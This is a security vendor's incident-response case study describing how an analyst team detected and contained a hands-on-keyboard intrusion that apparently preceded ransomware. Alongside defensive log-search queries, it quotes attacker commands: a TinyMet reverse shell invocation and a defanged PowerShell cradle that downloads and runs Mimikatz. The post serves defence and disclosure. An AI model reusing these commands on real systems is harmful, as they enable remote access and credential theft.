May 11, 2021

This blog describes a recent incident that highlights the CrowdStrike Falcon Complete™
team’s ability to act as an extension of a customer’s security team to quickly detect, triage
and contain an active attacker before it was able to achieve its goal. In this example, we
outline how a fast, coordinated response by the Falcon Complete, Falcon OverWatch™
threat hunting and CrowdStrike® Intelligence teams — over a holiday weekend — stopped a
big game hunting ransomware actor in its tracks. This response methodology protects our
customers 24/7/365 and delivers on the CrowdStrike promise: We stop breaches.

The Initial Detection
The CrowdStrike Falcon® agent identified that “a process attempted to download a file using
bitsadmin in an unusual way,” which caused a “High” alert within the Falcon UI and the
Falcon Complete team’s queue.

The high severity quickly caught the attention of Falcon Complete, and after expanding the
process tree within the Falcon UI, analysts’ suspicions of ongoing nefarious activities were
raised. The team quickly identified initial reconnaissance commands, followed immediately
by a pivot into a “living off the land” technique of abusing bitsadmin.exe to download an
unknown file. (“Living off the land” is a well-known technique where threat actors use built-in
features to slip under the radar of less sophisticated endpoint detection and response (EDR)
solutions.)
Spawning from wmiprvse.exe, which suggests WMI lateral movement, bitsadmin — an inbuilt
Windows Administrator tool commonly used by threat actors to download files — was used
to download the unknown file “cmk.ex” from the a remote address via port 81 to
C:\Users\Public\Pictures\cmk.ex. This file was then renamed, using the Windows tool
“move,” to a Windows-recognized executable extension file “cmk.exe.” The use of port 81
and a non-standard executable extension, which was then locally renamed, was assessed to
be an attempt to avoid detection by potential network intrusion detection systems.
Once renamed, the file was executed with the command line “cmk.exe 1 <REMOTE IP> 80.”
Utilizing unique strings appearing within the binary obtained via using the utility strings,
Falcon Complete determined that the file was a custom-compiled, packed and heavily
obfuscated version of the tool TinyMet.
TinyMet
Usage: tinymet.exe [transport] LHOST LPORT
Available transports are as follows:
0: reverse_tcp
1: reverse_http
2: reverse_https
3: bind_tcp

At this stage, the Falcon Complete team was confident that this activity was not benign and
began a quick and calculated remediative effort to remove the threat without causing an
unnecessary negative business impact. Falcon Complete began by killing and remediating
cmk.exe to ensure its added capabilities were not available to the threat actor.
However, shortly after the removal of the cmk.exe file, Falcon blocked and alerted on a WMI
lateral movement attempting to spawn and run a PowerShell downgrade attack followed by
an attempted download and execution of the post-exploitation tool Mimikatz.
iex((new-object
net.webclient).DownloadString('hxxps[://]raw[.]githubusercontent[.]com/PowerShellMafia
Mimikatz[.]ps1'))

At this point, Falcon Complete assessed that the risk posed to the host and the environment
was too high to allow attempts to continue while investigating. Therefore, the preventive step
of network containment was taken against the host. This denied all access to the host, other
than via the Falcon platform, and gave Falcon Complete time to safely delve into the
detection data.
From here, Falcon Complete re-pivoted the investigation into the extensive investigation
toolset within the Falcon UI — including User Search and Endpoint Activity Monitoring (EAM)
— to gain further context and determine the origin of the activity.

Finding Patient Zero
As identified, WMI was being used to laterally move from another host, and Falcon Complete
now began to dig to find Patient Zero and any files or commands that had been run on the
host.
The lightweight CrowdStrike Falcon agent provides a rich source of EDR telemetry that
provides critical insights into the behavior of each endpoint. Our EAM application gives the
Falcon Complete team and Falcon customers the ability to search this execution data in real
time to quickly investigate and scope the extent of compromise for an incident.
This telemetry, combined with pre-defined reporting in Falcon’s Investigate app, enabled the
Falcon Complete team to identify compromised user accounts and the original source of the
threat actor’s activity.
During the investigation, Falcon OverWatch simultaneously pushed a detection to the Falcon
Complete team for review — it involved additional lateral movement attempts from an IP that
did not have the Falcon agent installed, leveraging PSExec to run reconnaissance
commands on further hosts, and write a binary with the name “info.zip.”

Figure 4. Process tree for the Falcon OverWatch alert
With the attacker methodology flagged by Falcon OverWatch, the Falcon Complete team
was able to use specialized EAM searches to track the activity to a specific system on the
network.
event_simpleName=ProcessRollup2 (FileName=psexecsvc.exe OR FileName=wsmprovhost.exe)
| stats values(FileName) AS Parent, values(CommandLine) AS ParentCmd by ComputerName
TargetProcessId_decimal
| join aid TargetProcessId_decimal
[ search ProcessRollup2
| stats values(FileName) AS FileName,
values(CommandLine) AS ChildCommand by ComputerName ParentProcessId_decimal
| rename FilePath AS ChildPath
| eval TargetProcessId_decimal=ParentProcessId_decimal ]

Figure 5. Falcon EAM Query for all PSExec lateral movement telemetry data
Armed with the origin system, it was possible to use Host Search in the Investigate app to
identify the most recently logged-on user, which allowed a further pivot to User Search to
identify where the compromised account had been used to log in to other systems via
legitimate Windows means.

4/8

Due to the telemetry available from the Falcon sensor in the environment, the “living off the
land” attempt did not work.
event_simpleName=UserLogon (LogonType_decimal="3" OR LogonType_decimal="10") | eval
timestamp=(timestamp / 1000)
| convert timeformat="%FT%H:%M:%S.%3N UTC" ctime(timestamp) AS timestamp_readable |
stats count AS Count, min(timestamp_readable) AS "First Logon",
max(timestamp_readable) AS "Last Logon", values(UserPrincipal) AS UserPrincipal by
UserName, ComputerName
| sort timestamp_readable

Figure 6. Falcon EAM Query for all RDP logon telemetry data/span>
Because logon events are closely tracked by the Falcon agent, and we know that using tools
such as PSExec and RDP (Remote Desktop Protocol) generate Type 3 or Type 10 logon
events within the data collected by Falcon (and Windows event logs), we can use this
knowledge and Falcon’s event data to more quickly obtain valuable information normally
tracked in Windows logs.
In this case, we can obtain the logon times, source network address and username that are
being used by the threat actor and use this information to inform actions taken by the Falcon
Complete team, as well as those undertaken by the customer.
Using the above query, the Falcon Complete team was able to build a complete picture of
the compromised account within minutes and identify Patient Zero — the compromised
system and user that was the source of the RDP logons and PSExec commands.
Falcon Complete noted during the investigation that during nearly all of the lateral movement
attempts by the threat actor, regardless of execution method, the parent process was
WMIPrvSE.exe — the windows binary responsible for executing remote WMI calls.
A further query could be used to confirm our suspicions and ensure that Patient Zero was
successfully identified.
event_simpleName=WmiCreateProcess | eval timestamp=(timestamp / 1000)
| convert timeformat="%FT%H:%M:%S.%3N UTC" ctime(timestamp) AS ExecutionTime
| table ExecutionTime, ComputerName, RemoteAddressIP4, LocalAddressIP4, CommandLine
| sort ExecutionTime

an environment
Armed with data confirming Patient Zero via several “living off the land” techniques leveraged
by the threat actor, Falcon Complete was able to confidently assess the source of the
intrusion, begin to implement policies that would slow the actor, and inform the customer of
actions to be taken to fully remove the threat from the environment, such as installing the
Falcon agent on the source host so that network containment and remediation could begin at
the source.

Because Falcon Complete sees a wide range of adversarial threats daily, we can develop
queries such as those shown to enable fast triage and response to detections in situations
where every minute matters.

The Remediation
In this case, the threat was an active hands-on-keyboard attack, and after non-businessdisruptive remediation proved unsuccessful, Falcon Complete opted to network-contain
hosts that the threat actor had access to. This led to five hosts being contained in the
environment. Once contained, all artifacts, including executables and persistence, were
remediated from the hosts.
To ensure full remediation, actions that needed to be taken outside of the scope of the
Falcon sensor were escalated to the customer:
Disabling of compromised account
Blocking threat actor infrastructure at perimeter firewalls
Installation of the Falcon sensor onto Patient Zero
Due to this activity being both over a holiday weekend and after-hours for the customer, we
did not receive immediate responses from our escalations. As a result, and to help contain
the threat actor, Falcon Complete implemented a custom indicator of attack (IOA) that would
detect, in real time, any connections from the unmanaged Patient Zero device or the
command and control (C2) identified. This would allow immediate investigation and response
before the threat actor could take any meaningful action on the newly accessed host. To
further this custom IOA, all bespoke tools used by the threat actor were blocklisted in the
Falcon UI.

Once we received replies from the customer shortly thereafter, the customer was able to
quickly install the Falcon sensor onto the unmanaged Patient Zero due to the Falcon
platform’s lightweight, single agent architecture. Immediately, Falcon Complete began to use

the Falcon Real Time Response (RTR) functionality to triage the host. With the intelligence
and TTPs gained from the investigation, Falcon Complete was quickly able to pivot into the
known locations the threat actor stored tools and data.
Falcon Complete located a number of reconnaissance files, including lists of 50 internal IP
addresses as well as bespoke scripts to build the toolset observed on the hosts previously
remediated. Again, Falcon Complete remediated the malicious tools and threat-actorgathered intelligence on this host.
Once Patient Zero was remediated and the compromised account disabled, this instance of
the threat could be considered successfully neutralized.

CrowdStrike Intelligence Analysis
Per the standard procedure of the Falcon Complete team, we provided the CrowdStrike
Intelligence team with samples of the cmk.exe and info.zip files, as well as the network
indicators identified during the
investigation.
Of interest to our investigation was that the Intelligence team identified that the staging IP
address was also hosting an additional file on port 81 named 2.zip, which contained a binary
identified as a known ransomware variant.
While the CrowdStrike Intelligence team does not specifically attribute this attack to any
named adversaries or any specific ransomware-as-a-service (RaaS) affiliate, the quick
actions from the Falcon Complete team prevented this customer from almost certainly
becoming a victim of a big game hunting ransomware operation.

Summary
Falcon Complete initially identified an executable download of TinyMet and the attempted
execution of a TCP reverse shell within our customer’s environment. Using Process Explorer
as well as EAM, we were able to identify multiple attempts at lateral movement from a host
that did not have the Falcon sensor installed.
Falcon Complete then used the Host Search functionality to identify the compromised user
credentials before pivoting to User Search to identify where the compromised user account
was being used for lateral movement. This allowed us to place those hosts into network
containment, as well as block lateral movement attempts from the host without the Falcon
sensor. We were able to block the threat actor’s malicious executables and stop them in their
tracks. These quick actions protected our customer and almost certainly prevented them
from falling victim to a ransom attempt.

7/8

All of this malicious activity and the Falcon Complete team’s response and remediation
happened over a holiday weekend, showing the importance of 24/7/365 security monitoring
in a corporate environment and the power of partnering with CrowdStrike and Falcon
Complete. The Falcon Complete team’s response methodology provides these kinds of
results for our customers at all hours of every day to stop breaches.
We look forward to sharing more case studies and providing some best practices for quick
and effective incident response.
